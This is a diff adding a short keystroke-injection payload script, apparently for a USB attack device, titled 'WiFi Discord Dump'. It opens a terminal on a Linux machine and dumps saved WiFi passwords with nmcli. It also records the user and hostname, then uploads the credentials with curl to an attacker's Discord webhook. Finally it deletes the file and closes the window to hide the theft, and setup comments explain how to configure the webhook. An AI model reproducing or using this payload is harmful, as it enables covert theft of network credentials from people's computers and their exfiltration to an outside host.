@@ -1,0 +1,25 @@
+REM Title: WiFi Discord Dump
+REM Author: UndedInside
+REM Description: Dumps WiFi creds and sends them via discord webhook
+
+REM SETUP:
+REM In your discord server, open server settings, go to "Integrations > Webhooks" and create a new one
+REM Press the 'Copy Webhook URL' button and replace [WEBHOOK] in the below script.
+
+REM Open terminal:
+DEFAULT_DELAY 400
+ALT t
+DELAY 500
+STRINGLN cd /tmp
+
+REM Dump WiFi creds to file and enumerate hostname:
+STRINGLN nmcli device wifi show-password > creds.txt
+STRINGLN info=`whoami`@`hostname`
+
+REM Send file:
+STRINGLN curl -F 'payload_json={"username": "'"$info"'", "content": "WiFi creds:"}' -F "file1=@creds.txt" "[WEBHOOK]" 
+DELAY 700
+
+REM Cleanup:
+STRINGLN rm creds.txt
+ALT F4
